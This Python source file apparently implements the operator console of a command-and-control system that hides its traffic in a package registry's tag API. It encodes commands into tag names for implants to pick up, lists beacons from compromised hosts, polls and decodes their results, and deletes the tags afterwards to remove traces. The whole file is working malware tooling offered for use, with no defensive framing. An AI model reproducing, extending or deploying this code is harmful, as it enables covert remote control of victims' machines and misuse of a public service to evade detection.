import requests
import time

from . import CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, UA, API
from . import encode_payload, decode_tag


class Operator:
    def __init__(self, package, token):
        self.package = package
        self.s = requests.Session()
        self.s.headers.update({
            "Authorization": f"Bearer {token}",
            "User-Agent": UA,
        })

    def push_task(self, command):
        for tag in encode_payload(command.encode(), CMD_PREFIX):
            url = API.format(self.package) + "/" + tag
            r = self.s.put(url, json=TAG_VALUE)
            if r.status_code >= 300:
                print(f"[-] {tag}: HTTP {r.status_code}")
                return False
            print(f"[+] {tag}")
        return True

    def poll_results(self):
        for name, info in self._results():
            data = info[1].decode(errors="replace")
            print(f"[res] {data}")
            print("---")
        if not self._results():
            print("[i] no results")

    def list_beacons(self):
        tags = self._fetch()
        names = [t for t in tags if t.startswith(HBT_PREFIX)]
        for n in names:
            print(f"[beacon] {n}")
        if not names:
            print("[i] no beacons")

    def clean_tags(self, all_tags=False):
        tags = self._fetch()
        count = 0
        for name in list(tags):
            if all_tags:
                if name == "latest":
                    continue
            elif not any(name.startswith(p) for p in (CMD_PREFIX, RES_PREFIX, HBT_PREFIX)):
                continue
            url = API.format(self.package) + "/" + name
            r = self.s.delete(url)
            if r.status_code < 300:
                count += 1
        print(f"[+] removed {count} tags" if count else "[i] nothing to clean")

    def watch(self, interval=5):
        seen = set()
        print(f"[*] watching (every {interval}s)")
        try:
            while True:
                tags = self._fetch()
                for name in tags:
                    if name.startswith(RES_PREFIX) and name not in seen:
                        seen.add(name)
                        info = decode_tag(name)
                        if info:
                            print(f"[{time.strftime('%H:%M:%S')}] "
                                  f"{info[1].decode(errors='replace')}")
                time.sleep(interval)
        except KeyboardInterrupt:
            pass

    def stats(self):
        tags = self._fetch()
        cmds = [t for t in tags if t.startswith(CMD_PREFIX)]
        res = [t for t in tags if t.startswith(RES_PREFIX)]
        hbt = [t for t in tags if t.startswith(HBT_PREFIX)]
        print(f"pending: {len(cmds)}, results: {len(res)}, beacons: {len(hbt)}")
        for c in sorted(cmds)[:5]:
            print(f"  {c}")

    def _results(self):
        out = []
        for name, val in sorted(self._fetch().items()):
            if name.startswith(RES_PREFIX):
                info = decode_tag(name)
                if info:
                    out.append((name, info))
        return out

    def _fetch(self):
        r = self.s.get(API.format(self.package))
        return r.json() if r.status_code == 200 else {}
